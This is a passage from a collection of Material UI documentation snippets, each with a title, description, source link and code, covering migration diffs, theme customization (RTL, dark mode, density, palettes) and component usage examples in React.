lab to core.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n-import Alert from '@mui/lab/Alert';\n-import AlertTitle from '@mui/lab/AlertTitle';\n+import Alert from '@mui/material/Alert';\n+import AlertTitle from '@mui/material/AlertTitle';\n```\n\n----------------------------------------\n\nTITLE: Configuring Theme Direction with extendTheme\nDESCRIPTION: Use Joy UI's extendTheme API to set the theme direction to RTL in your application's theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  direction: 'rtl',\n});\n```\n\n----------------------------------------\n\nTITLE: Custom Storage Manager Implementation\nDESCRIPTION: Shows how to implement a custom storage manager for handling color scheme preferences.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\nimport type { StorageManager } from '@mui/material/styles';\n\nconst theme = createTheme({\n  colorSchemes: {\n    dark: true,\n  },\n});\n\nfunction storageManager(params): StorageManager {\n  return {\n    get: (defaultValue) => {\n      // Your implementation\n    },\n    set: (value) => {\n      // Your implementation\n    },\n    subscribe: (handler) => {\n      // Your implementation\n      return () => {\n        // cleanup\n      };\n    },\n  };\n}\n\nfunction App() {\n  return (\n    <ThemeProvider theme={theme} storageManager={storageManager}>\n      ...\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Right-Aligned Timeline in React\nDESCRIPTION: Shows how to create a right-aligned Timeline component within its container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"RightAlignedTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing transition easing functions in MUI theme\nDESCRIPTION: Example of how to customize transition easing values in the Material-UI theme. Shows the default cubic-bezier values and their intended use cases, which can be overridden or extended.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/transitions/transitions.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  transitions: {\n    easing: {\n      // This is the most common easing curve.\n      easeInOut: 'cubic-bezier(0.4, 0, 0.2, 1)',\n      // Objects enter the screen at full velocity from off-screen and\n      // slowly decelerate to a resting point.\n      easeOut: 'cubic-bezier(0.0, 0, 0.2, 1)',\n      // Objects leave the screen at full velocity. They do not decelerate when off-screen.\n      easeIn: 'cubic-bezier(0.4, 0, 1, 1)',\n      // The sharp curve is used by objects that may return to the screen at any time.\n      sharp: 'cubic-bezier(0.4, 0, 0.6, 1)',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Applying Styles with sx Prop Directly on HTML Elements using Pigment CSS in JSX (Diff)\nDESCRIPTION: This diff illustrates the simplification achieved with Pigment CSS integration in Material UI v6. It shows removing the need for a wrapping Box component and applying the `sx` prop directly to a standard HTML `img` element for custom styling. This leverages Pigment CSS's ability to process the `sx` prop on any JSX element during build time.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-import Box from '@mui/material/Box';\n\n-<Box component=\"img\" sx={{ padding: 2 }} />\n+<img sx={{ padding: 2 }} />\n```\n\n----------------------------------------\n\nTITLE: Updating createGenerateClassName Import Path\nDESCRIPTION: Diff showing the update to import createGenerateClassName from @mui/styles instead of @mui/material/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n-import { createGenerateClassName } from '@mui/material/styles';\n+import { createGenerateClassName } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Alert Component HTML Structure\nDESCRIPTION: The basic HTML structure of the Alert component, showing its root element with the 'alert' role for accessibility.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/alert/alert.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div role=\"alert\" class=\"MuiAlert-root\">\n  <!-- Alert contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Responsive Spacing in Masonry\nDESCRIPTION: Demonstrates responsive spacing implementation in Masonry layouts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nResponsiveSpacing.js\n```\n\n----------------------------------------\n\nTITLE: Custom Columns Grid\nDESCRIPTION: Example showing how to change the default number of columns (12) using the columns prop for different layout structures.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"ColumnsGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Updating `withStyles` HOC Usage in JavaScript/JSX\nDESCRIPTION: Illustrates the necessary changes when using the `withStyles` HOC during migration to MUI v5. The import path is changed from '@mui/material/styles' to '@mui/styles'. Additionally, it demonstrates the requirement of wrapping the component with `ThemeProvider` from '@mui/material/styles' and providing a theme, as `defaultTheme` is no longer available automatically.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_34\n\nLANGUAGE: diff\nCODE:\n```\n-import { withStyles } from '@mui/material/styles';\n+import { withStyles } from '@mui/styles';\n+import { createTheme, ThemeProvider } from '@mui/material/styles';\n\n+const defaultTheme = createTheme();\n  const MyComponent = withStyles((props) => {\n    const { classes, className, ...other } = props;\n    return <div className={clsx(className, classes.root)} {...other} />\n  })(({ theme }) => ({ root: { background: theme.palette.primary.main }}));\n\n  function App() {\n-  return <MyComponent />;\n+  return <ThemeProvider theme={defaultTheme}><MyComponent /></ThemeProvider>;\n  }\n```\n\n----------------------------------------\n\nTITLE: Array-based Custom Spacing\nDESCRIPTION: Shows how to implement custom spacing using an array of predefined values\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  spacing: [0, 4, 8, 16, 32, 64],\n});\n\ntheme.spacing(2); // = '8px'\n```\n\n----------------------------------------\n\nTITLE: RenderInput Prop Usage\nDESCRIPTION: Examples of using the new required renderInput prop with DatePicker component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<DatePicker renderInput={(props) => <TextField {...props} />} />\n<TimePicker renderInput={(props) => <TextField {...props} />} />\n```\n\n----------------------------------------\n\nTITLE: Emotion RTL Cache Configuration\nDESCRIPTION: Setup of RTL cache provider for Emotion styling with stylis-plugin-rtl integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\nimport { prefixer } from 'stylis';\nimport rtlPlugin from 'stylis-plugin-rtl';\n\n// Create rtl cache\nconst rtlCache = createCache({\n  key: 'muirtl',\n  stylisPlugins: [prefixer, rtlPlugin],\n});\n\nfunction Rtl(props) {\n  return <CacheProvider value={rtlCache}>{props.children}</CacheProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Row and Column Spacing in Grid Components with React\nDESCRIPTION: Demonstrates how to use the rowSpacing and columnSpacing props in the Grid container component to create different spacing between rows and columns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container rowSpacing={1} columnSpacing={2} />\n```\n\n----------------------------------------\n\nTITLE: Setting Margin Using Theme Spacing with sx Prop in Material UI JSX\nDESCRIPTION: Shows how spacing properties like `margin` (and `padding`, plus their longhand versions and aliases like `m`, `mt`, `p`, `px`, etc.) within the `sx` prop multiply their numeric value by the `theme.spacing` unit (default 8px) to calculate the final pixel value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_11\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ margin: 2 }} />\n// equivalent to margin: theme => theme.spacing(2)\n```\n\n----------------------------------------\n\nTITLE: Applying Inline Styles with the `sx` Prop in Pigment CSS (JSX)\nDESCRIPTION: This snippet showcases the usage of the `sx` prop, extended by Pigment CSS to work on standard HTML elements like `<section>`, `<h1>`, and `<p>`. It demonstrates applying various styles directly inline, including padding (`p`), borders (`border`, `borderColor` with theme value `divider`), font size (`fontSize`), font weight (`fontWeight`), margin bottom (`mb`), and text color (`color` with theme value `text.primary`). This approach allows for performant, theme-aware styling without needing wrapper components like MUI's Box.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-pigment-css.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<section sx={{ p: 2, border: '1px solid', borderColor: 'divider' }}>\n  <h1 sx={{ fontSize: '2rem', fontWeight: 700, mb: 1 }}>\n    Introducing Pigment\\u00A0CSS: the next generation of CSS-in-JS\n  </h1>\n  <p sx={{ color: 'text.primary', fontWeight: 500 }}>\n    Pigment\\u00A0CSS offers significant performance gains along with RSC\n  </p>\n</section>\n```\n\n----------------------------------------\n\nTITLE: Controlling Badge Visibility in React Material-UI\nDESCRIPTION: Demonstrates visibility control of badges using the invisible prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\nBadgeVisibility.js\n```\n\n----------------------------------------\n\nTITLE: Configuring High-Density Theme for Material UI Components in JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a Material UI theme with high-density settings applied to various components. It sets default props for components like Button, FilledInput, FormControl, and others to achieve a more compact layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/density/density.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiButton: {\n      defaultProps: {\n        size: 'small',\n      },\n    },\n    MuiFilledInput: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiFormControl: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiFormHelperText: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiIconButton: {\n      defaultProps: {\n        size: 'small',\n      },\n    },\n    MuiInputBase: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiInputLabel: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiListItem: {\n      defaultProps: {\n        dense: true,\n      },\n    },\n    MuiOutlinedInput: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiFab: {\n      defaultProps: {\n        size: 'small',\n      },\n    },\n    MuiTable: {\n      defaultProps: {\n        size: 'small',\n      },\n    },\n    MuiTextField: {\n      defaultProps: {\n        margin: 'dense',\n      },\n    },\n    MuiToolbar: {\n      defaultProps: {\n        variant: 'dense',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: TextField-based Select Implementation\nDESCRIPTION: Demonstrates using Select within TextField component for simplified label handling\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/selects/selects.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<TextField id=\"select\" label=\"Age\" value=\"20\" select>\n  <MenuItem value=\"10\">Ten</MenuItem>\n  <MenuItem value=\"20\">Twenty</MenuItem>\n</TextField>\n```\n\n----------------------------------------\n\nTITLE: System Mode Detection Examples\nDESCRIPTION: Code examples showing how to determine and use system color mode with useColorScheme hook.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/configuration.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst { mode, systemMode } = useColorScheme();\n\nconsole.log(mode); // 'system'\nconsole.log(systemMode); // 'light' | 'dark'\n```\n\nLANGUAGE: javascript\nCODE:\n```\nconst { mode, systemMode } = useColorScheme();\n\nconsole.log(mode); // 'light' | 'dark'\nconsole.log(systemMode); // undefined\n```\n\n----------------------------------------\n\nTITLE: Controlling Total Avatars in AvatarGroup\nDESCRIPTION: Demonstrates how to control the total number of avatars not shown in an AvatarGroup using the 'total' prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"TotalAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Grid with Spacing Configuration\nDESCRIPTION: Example showing how to control space between grid children using the spacing prop, which is converted to CSS using theme.spacing() helper.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"SpacingGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Basic Chip Component Implementation - React/JSX\nDESCRIPTION: Basic implementation of the Chip component showing how to import and use it in a React application. The component comes with medium size, primary color, and solid variant by default.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/chip/chip.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Chip from '@mui/joy/Chip';\n\nexport default function MyApp() {\n  return <Chip>My chip</Chip>;\n}\n```\n\n----------------------------------------\n\nTITLE: Extending Theme with Custom Info Palette\nDESCRIPTION: Implementation of custom info palette in Joy UI theme including light and dark mode configurations\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst info = {\n  50: '#FDF7FF',\n  100: '#F4EAFF',\n  200: '#E1CBFF',\n  300: '#C69EFF',\n  400: '#A374F9',\n  500: '#814DDE',\n  600: '#5F35AE',\n  700: '#452382',\n  800: '#301761',\n  900: '#1D0A42'\n};\n\nconst theme = extendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        info: {\n          ...info,\n          plainColor: `var(--joy-palette-info-600)`,\n          plainHoverBg: `var(--joy-palette-info-100)`,\n          plainActiveBg: `var(--joy-palette-info-200)`,\n          plainDisabledColor: `var(--joy-palette-info-200)`,\n          outlinedColor: `var(--joy-palette-info-500)`,\n          outlinedBorder: `var(--joy-palette-info-200)`,\n          outlinedHoverBg: `var(--joy-palette-info-100)`,\n          outlinedHoverBorder: `var(--joy-palette-info-300)`,\n          outlinedActiveBg: `var(--joy-palette-info-200)`,\n          outlinedDisabledColor: `var(--joy-palette-info-100)`,\n          outlinedDisabledBorder: `var(--joy-palette-info-100)`,\n          softColor: `var(--joy-palette-info-600)`,\n          softBg: `var(--joy-palette-info-100)`,\n          softHoverBg: `var(--joy-palette-info-200)`,\n          softActiveBg: `var(--joy-palette-info-300)`,\n          softDisabledColor: `var(--joy-palette-info-300)`,\n          softDisabledBg: `var(--joy-paletteinfo}-50)`,\n          solidColor: '#fff',\n          solidBg: `var(--joy-palette-info-500)`,\n          solidHoverBg: `var(--joy-palette-info-600)`,\n          solidActiveBg: `var(--joy-palette-info-700)`,\n          solidDisabledColor: `#fff`,\n          solidDisabledBg: `var(--joy-palette-info-200)`\n        }\n      }\n    },\n    dark: {\n      palette: {\n        info: {\n          ...info,\n          plainColor: `var(--joy-palette-info-300)`,\n          plainHoverBg: `var(--joy-palette-info-800)`,\n          plainActiveBg: `var(--joy-palette-info-700)`,\n          plainDisabledColor: `var(--joy-palette-info-800)`,\n          outlinedColor: `var(--joy-palette-info-200)`,\n          outlinedBorder: `var(--joy-palette-info-700)`,\n          outlinedHoverBg: `var(--joy-palette-info-800)`,\n          outlinedHoverBorder: `var(--joy-palette-info-600)`,\n          outlinedActiveBg: `var(--joy-palette-info-900)`,\n          outlinedDisabledColor: `var(--joy-palette-info-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-info-800)`,\n          softColor: `var(--joy-palette-info-200)`,\n          softBg: `var(--joy-palette-info-900)`,\n          softHoverBg: `var(--joy-palette-info-800)`,\n          softActiveBg: `var(--joy-palette-info-700)`,\n          softDisabledColor: `var(--joy-palette-info-800)`,\n          softDisabledBg: `var(--joy-palette-info-900)`,\n          solidColor: `#fff`,\n          solidBg: `var(--joy-palette-info-600)`,\n          solidHoverBg: `var(--joy-palette-info-700)`,\n          solidActiveBg: `var(--joy-palette-info-800)`,\n          solidDisabledColor: `var(--joy-palette-info-700)`,\n          solidDisabledBg: `var(--joy-palette-info-900)`\n        }\n      }\n    }\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Comprehensive JSS to TSS-React Migration with Advanced Features\nDESCRIPTION: A comprehensive example demonstrating migration of complex JSS styles with $ syntax, parameters, classes prop merging, and explicit naming for stylesheets to TSS-React.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n-import clsx from 'clsx';\n-import { makeStyles, createStyles } from '@material-ui/core/styles';\n+import { makeStyles } from 'tss-react/mui';\n\n-const useStyles = makeStyles((theme) => createStyles<\n-  'root' | 'small' | 'child', {color: 'primary' | 'secondary', padding: number}\n->\n-({ \n-  root: ({color, padding}) => ({\n+const useStyles = makeStyles<{color: 'primary' | 'secondary', padding: number}, 'child' | 'small'>({name: 'App'})((theme, { color, padding }, classes) => ({\n+  root: {\n     padding: padding,\n-    '&:hover $child': {\n+    [`&:hover .${classes.child}`]: {\n       backgroundColor: theme.palette[color].main,\n     }\n-  }),\n+  },\n   small: {},\n   child: {\n     border: '1px solid black',\n     height: 50,\n-    '&$small': {\n+    [`&.${classes.small}`]: {\n       height: 30\n     }\n   }\n-}), {name: 'App'});\n+}));\n\n function App({classes: classesProp}: {classes?: any}) {\n-  const classes = useStyles({color: 'primary', padding: 30, classes: classesProp});\n+  const { classes, cx } = useStyles({\n+    color: 'primary',\n+    padding: 30\n+  }, {\n+    props: {\n+      classes: classesProp\n+    }\n+  });\n\n   return (\n     <div className={classes.root}>\n       <div className={classes.child}>\n         The Background take the primary theme color when the mouse hovers the parent.\n       </div>\n-      <div className={clsx(classes.child, classes.small)}>\n+      <div className={cx(classes.child, classes.small)}>\n         The Background take the primary theme color when the mouse hovers the parent.\n         I am smaller than the other child.\n       </div>\n     </div>\n   );\n }\n\n export default App;\n```\n\n----------------------------------------\n\nTITLE: Basic Masonry Implementation in React\nDESCRIPTION: Demonstrates basic usage of the Masonry component as a container for various elements like div and img tags.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nBasicMasonry.js\n```\n\n----------------------------------------\n\nTITLE: Running JSS to TSS-React Codemod Command\nDESCRIPTION: Command to execute the JSS to TSS-React migration codemod on a specified path. This transforms JSS styling with makeStyles or withStyles to use tss-react API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_90\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/jss-to-tss-react <path>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Button using MUI Base Unstyled Components (TSX)\nDESCRIPTION: Illustrates the structure for building a custom button component using MUI Base (unstyled components). It utilizes the `useButton` hook to manage button state (active, disabled, focusVisible) and applies props to a root element (`CustomButtonRoot`). This approach separates logic from styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_6\n\nLANGUAGE: tsx\nCODE:\n```\nconst CustomButton = React.forwardRef(function CustomButton(\n  props: ButtonUnstyledProps,\n  ref: React.ForwardedRef<any>,\n) {\n  const { children } = props;\n  const { active, disabled, focusVisible, getRootProps } = useButton({\n    ...props,\n    ref,\n    component: CustomButtonRoot,\n  });\n\n  const classes = {\n    active,\n    disabled,\n    focusVisible,\n  };\n\n  return (\n    <CustomButtonRoot {...getRootProps()} className={clsx(classes)}>\n      {children}\n    </CustomButtonRoot>\n  );\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring yarn package.json for styled-components with Material UI\nDESCRIPTION: Demonstrates how to update package.json to replace the default Emotion styling engine with styled-components using yarn package resolution.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/styled-components/styled-components.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n```diff title=\"package.json\"\n {\n   \"dependencies\": {\n-    \"@mui/styled-engine\": \"latest\"\n+    \"@mui/styled-engine\": \"npm:@mui/styled-engine-sc@latest\"\n   },\n+  \"resolutions\": {\n+    \"@mui/styled-engine\": \"npm:@mui/styled-engine-sc@latest\"\n+  },\n }\n```\n```\n\n----------------------------------------\n\nTITLE: Alert with Background Fix for Snackbar - React/JSX\nDESCRIPTION: Example showing how to fix background bleed-through when using Alert with Snackbar by adding background color via sx prop\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/alert/alert.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Alert sx={{ bgcolor: 'background.paper' }} />\n```\n\n----------------------------------------\n\nTITLE: Using adaptV4Theme Helper for Theme Migration\nDESCRIPTION: Example demonstrating how to use the adaptV4Theme helper to migrate from Material UI v4 theme structure to v5 theme structure for a smoother transition.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-import { createMuiTheme } from '@mui/material/styles';\n+import { createTheme, adaptV4Theme } from '@mui/material/styles';\n\n-const theme = createMuiTheme({\n+const theme = createTheme(adaptV4Theme({\n   // v4 theme\n-});\n+}));\n```\n\n----------------------------------------\n\nTITLE: Updating StyledEngineProvider Import Path\nDESCRIPTION: Shows how to update the import path for StyledEngineProvider from the deprecated @mui/material to the correct @mui/material/styles path.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n-import { StyledEngineProvider } from '@mui/material';\n+import { StyledEngineProvider } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Customizing MUI Select Listbox Variant using slotProps in JavaScript (JSX)\nDESCRIPTION: Illustrates how to apply a different style variant specifically to the listbox part of the MUI `Select` component. While the main component (button) uses the `plain` variant, the `slotProps` property is used to override the `listbox` slot's variant to `plain` (demonstrating the capability, though using the same variant here).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n<Select\n  variant=\"plain\"\n  slotProps={{\n    listbox: {\n      variant: 'plain',\n    }\n  }}\n>\n\n```\n\n----------------------------------------\n\nTITLE: Implementing Slider with Input Field in React\nDESCRIPTION: Demonstrates how to create a slider with an input field that allows setting a discrete value in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_9\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"InputSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Disabling All Transitions and Animations in Material UI\nDESCRIPTION: Comprehensive approach to disable all transitions and animation effects using CssBaseline component configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material';\n\nconst theme = createTheme({\n  components: {\n    // Name of the component ⚛️\n    MuiCssBaseline: {\n      styleOverrides: {\n        '*, *::before, *::after': {\n          transition: 'none !important',\n          animation: 'none !important',\n        },\n      },\n    },\n  },\n});\n```\n\nLANGUAGE: css\nCODE:\n```\n*,\n*::before,\n*::after {\n  transition: 'none !important';\n  animation: 'none !important';\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from GridList to ImageList in React\nDESCRIPTION: Renames GridList components to ImageList and updates related props to align with current Material Design naming conventions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n-import GridList from '@mui/material/GridList';\n-import GridListTile from '@mui/material/GridListTile';\n-import GridListTileBar from '@mui/material/GridListTileBar';\n+import ImageList from '@mui/material/ImageList';\n+import ImageListItem from '@mui/material/ImageListItem';\n+import ImageListItemBar from '@mui/material/ImageListItemBar';\n\n-<GridList spacing={8} cellHeight={200}>\n-  <GridListTile>\n+<ImageList gap={8} rowHeight={200}>\n+  <ImageListItem>\n    <img src=\"file.jpg\" alt=\"Image title\" />\n-    <GridListTileBar\n+    <ImageListItemBar\n      title=\"Title\"\n      subtitle=\"Subtitle\"\n    />\n-  </GridListTile>\n-</GridList>\n+  </ImageListItem>\n+</ImageList>\n```\n\n----------------------------------------\n\nTITLE: Updating TablePagination label customization in React\nDESCRIPTION: Changes the way labels are customized for TablePagination actions, using the getItemAriaLabel prop instead of individual text props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_30\n\nLANGUAGE: diff\nCODE:\n```\n  <TablePagination\n-  backIconButtonText=\"Back\"\n-  nextIconButtonText=\"Next\"\n+  getItemAriaLabel={…}\n```\n\n----------------------------------------\n\nTITLE: Starting MUI Documentation in Development Mode with pnpm\nDESCRIPTION: Command to start the MUI documentation website in development mode using pnpm. This must be run from the project root, and other package managers like npm or Yarn are not supported.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm docs:dev\n```\n\n----------------------------------------\n\nTITLE: Applying Theme-Based Border Radius with sx Prop in Material UI JSX\nDESCRIPTION: Illustrates applying border radius using the `borderRadius` key in the `sx` prop. The numeric value is multiplied by the `theme.shape.borderRadius` value (defaulting to 4px) to calculate the final pixel value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ borderRadius: 2 }} />\n// equivalent to borderRadius: theme => 2 * theme.shape.borderRadius\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Modal Layout with Theme Overrides\nDESCRIPTION: Example of extending the theme to create a custom 'top' layout for Modal Dialog using styleOverrides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/modal/modal.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst theme = extendTheme({\n  components: {\n    JoyModalDialog: {\n      defaultProps: { layout: 'top' },\n      styleOverrides: {\n        root: ({ ownerState }) => ({\n          ...(ownerState.layout === 'top' && {\n            top: '12vh',\n            left: '50%',\n            transform: 'translateX(-50%)',\n          }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating CSS Selectors for Divider Component\nDESCRIPTION: Migration example showing how to update CSS selectors for the Divider component, which now renders as a div instead of hr when using vertical orientation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n-import Divider from '@mui/material/Divider';\n+import Divider, { dividerClasses } from '@mui/material/Divider';\n\n const Main = styled.main({\n-  '& hr': {\n+  [`& .${dividerClasses.root}`]: {\n     marginTop: '16px',\n   },\n });\n```\n\n----------------------------------------\n\nTITLE: Setting HTML Direction Attribute\nDESCRIPTION: Basic HTML configuration to enable RTL direction globally by setting the dir attribute on the HTML root element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html dir=\"rtl\"></html>\n```\n\n----------------------------------------\n\nTITLE: Customizing Accordion Heading Component in Material UI v6\nDESCRIPTION: Example of how to customize the heading element of an Accordion component using the slotProps.heading.component prop to change the default h3 to h4.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Accordion slotProps={{ heading: { component: 'h4' } }}>\n  <AccordionSummary\n    expandIcon={<ExpandMoreIcon />}\n    aria-controls=\"panel1-content\"\n    id=\"panel1-header\"\n  >\n    Accordion\n  </AccordionSummary>\n  <AccordionDetails>\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse malesuada\n    lacus ex, sit amet blandit leo lobortis eget.\n  </AccordionDetails>\n</Accordion>\n```\n\n----------------------------------------\n\nTITLE: Changing Typography Semantic Element in React\nDESCRIPTION: JSX code demonstrating how to change the semantic element of a Typography component while maintaining its visual style.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/typography/typography.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Typography variant=\"h1\" component=\"h2\">\n  h1. 